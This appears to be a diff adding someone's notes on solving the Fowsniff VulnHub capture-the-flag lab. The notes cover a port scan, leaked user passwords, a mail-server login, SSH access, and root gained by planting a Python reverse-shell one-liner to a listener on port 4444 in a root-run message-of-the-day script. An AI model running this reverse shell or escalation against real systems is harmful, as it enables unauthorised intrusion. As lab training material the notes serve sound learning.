@@ -1,0 +1,108 @@
+
+ip address: 192.168.83.137
+ports:
+ 22/tcp  open  ssh
+ 80/tcp  open  http
+ 110/tcp open  pop3
+ 143/tcp open  imap
+
+Website says something about their Twitter account posting info.
+Twitter: @fowsniffcorp
+
+Is that your sysadmin? roflcopter stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+
+
+Pastebin dump link: https://pastebin.com/NrAqVeeX
+
+mauer@fowsniff:mailcall
+mustikka@fowsniff:bilbo101
+tegel@fowsniff:apples01
+baksteen@fowsniff:skyler22
+seina@fowsniff:scoobydoo2
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:carp4ever
+parede@fowsniff:orlando12
+sciana@fowsniff:07011972
+
+Try logging into POP3 server
+
+mauer - no
+mustikka -no
+tegel - no
+baksteen - no
+seina - yes ***
+
+Message 1:
+"""
+The temporary password for SSH is "S1ck3nBluff+secureshell"
+"""
+Message 2: baksteen is leaving early (probably hasn't updated the temp password)
+
+
+SSH
+baksteen::S1ck3nBluff+secureshell
+
+
+seems to be nothing in his folder - can't access others
+
+baksteen@fowsniff:~$ id
+uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
+
+ability to run /opt/cube/cube.sh (message/design for startup banner on ssh)
+-rw-rwxr-- 1 parede users 851 Mar 11  2018 cube.sh
+
+
+reverse shell for python3 (pentest monkey)
+
+  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.83.107",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+nc -lvp 4444
+connects - but logged in as baksteen
+
+grep -rnw / -e 'cube.sh'
+
+/etc/update-motd.d/00-header:31:sh /opt/cube/cube.sh
+
+/etc/motd (Message of the Day) -rwxr-xr-x 1 root root 1248 Mar 11  2018 00-header
+
+
+again, nc -lvp 4444
+
+
+root@kali:~/Desktop/VulnHub/Fowsniff# nc -lvp 4444
+listening on [any] 4444 ...
+connect to [192.168.83.107] from fowsniff [192.168.83.137] 56122
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+
+
+flag
+# cat flag.txt
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+
